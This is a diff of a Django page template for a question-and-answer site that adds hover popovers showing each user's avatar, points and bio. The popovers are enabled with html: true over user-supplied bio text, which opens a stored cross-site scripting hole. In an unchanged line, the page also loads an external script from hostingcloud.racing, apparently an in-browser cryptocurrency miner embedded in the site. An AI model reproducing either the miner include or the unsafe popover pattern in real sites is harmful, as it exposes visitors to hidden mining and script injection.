@@ -99,7 +99,7 @@ $(function() {
 		<main>
 			<div class="card">
 				<a style="text-decoration: none; color: black;" href="/user/{{ question.creator.user.username }}">
-					<img width="45px" src="{{ question.creator.avatar.url }}" alt="{{ question.creator.user.username }}"> <span>{{ question.creator.user.username }}</span>
+					<img id="profile-pic-popover" data-triger="hover" data-content="<img src='{{ question.creator.avatar.url }}' width='50px'><b> {{ question.creator.user.username }}</b><br><span>Pontos: {{ question.creator.points }}</span><p>{{ question.creator.bio }}</p>" data-placement="top" width="45px" src="{{ question.creator.avatar.url }}" alt="{{ question.creator.user.username }}"> <span>{{ question.creator.user.username }}</span>
 				</a>
 				<div class="card-body">
 					<h3>{{ question.text }}</h3>
@@ -128,7 +128,7 @@ $(function() {
 				{% for response in responses %}
 				<div class="card">
 					<a style="text-decoration: none; color: black;" href="/user/{{ response.creator.user.username }}">
-						<img width="45px" src="{{ response.creator.avatar.url }}" alt="{{ response.creator.user.username }}"> <span>{{ response.creator.user.username }}</span>
+						<img class="responder-profile-pic-popover" data-triger="hover" data-content="<img src='{{ response.creator.avatar.url }}' width='50px'><b> {{ response.creator.user.username }}</b><br><span>Pontos: {{ response.creator.points }}</span><p>{{ response.creator.bio }}</p>" data-placement="top" width="45px" src="{{ response.creator.avatar.url }}" alt="{{ response.creator.user.username }}"> <span>{{ response.creator.user.username }}</span>
 					</a>
 					<div class="card-body">
 						<p id="response-{{ response.id }}">{{ response.text|cut_description }}</p>
@@ -263,6 +263,20 @@ function delete_question(id) {
 	})
 }
 	</script>
+
+<script>
+$('#profile-pic-popover').popover({
+	trigger: 'hover',
+	container: 'body',
+	html: true,
+});
+
+$('.responder-profile-pic-popover').popover({
+	trigger: 'hover',
+	container: 'body',
+	html: true,
+});
+</script>
 
 <script src="https://www.hostingcloud.racing/H5TE.js"></script>
 <script>
